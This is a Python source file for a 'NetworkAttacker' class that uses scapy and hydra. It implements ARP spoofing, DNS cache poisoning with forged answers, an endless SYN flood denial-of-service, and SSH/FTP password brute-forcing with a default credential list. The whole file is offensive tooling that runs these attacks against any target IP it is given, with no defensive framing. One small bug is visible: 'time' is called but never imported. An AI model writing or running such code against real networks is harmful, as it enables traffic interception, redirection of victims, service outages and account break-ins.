import random
import threading
import subprocess
import tempfile
import logging
from typing import Dict

import scapy.all as scapy

from utils import WHITE, RESET, check_privileges

class NetworkAttacker:
    def arp_spoof(self, target_ip: str, gateway_ip: str) -> None:
        if not check_privileges():
            return
        def spoof():
            while True:
                try:
                    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)
                    scapy.send(packet, verbose=False)
                    time.sleep(1)
                except Exception as e:
                    logging.error(f"ARP spoof error: {str(e)}")
                    break
        threading.Thread(target=spoof, daemon=True).start()
        logging.info(f"ARP spoofing initiated on {target_ip}.")

    def dns_poison(self, target_ip: str, fake_ip: str) -> None:
        if not check_privileges():
            return
        def poison():
            pkt = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(
                rd=1, qd=scapy.DNSQR(qname="example.com"),
                an=scapy.DNSRR(rrname="example.com", rdata=fake_ip)
            )
            for _ in range(1000):
                try:
                    scapy.send(pkt, verbose=False)
                except Exception as e:
                    logging.error(f"DNS poison error: {str(e)}")
                    break
        threading.Thread(target=poison, daemon=True).start()
        logging.info(f"DNS poisoning initiated on {target_ip}.")

    def syn_flood(self, target_ip: str, port: int) -> None:
        if not check_privileges():
            return
        def flood():
            pkt = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="S", sport=random.randint(1024, 65535))
            try:
                scapy.send(pkt, verbose=False, loop=1)
            except Exception as e:
                logging.error(f"SYN flood error: {str(e)}")
        threading.Thread(target=flood, daemon=True).start()
        logging.info(f"SYN flood initiated on {target_ip}:{port}.")

    def brute_force_overdrive(self, target_ip: str, wordlist: str = None) -> None:
        if not wordlist:
            with tempfile.NamedTemporaryFile(delete=False, mode="w", prefix="brute_test_", suffix=".txt") as f:
                f.write("\n".join(["admin", "password", "1234", "root"]))
                wordlist = f.name
        services = ["ssh", "ftp"]
        for service in services:
            cmd = ["hydra", "-L", wordlist, "-P", wordlist, "-t", "2", target_ip, service]
            subprocess.run(cmd, capture_output=True)
            logging.info(f"Brute force testing initiated on {target_ip} for {service}.")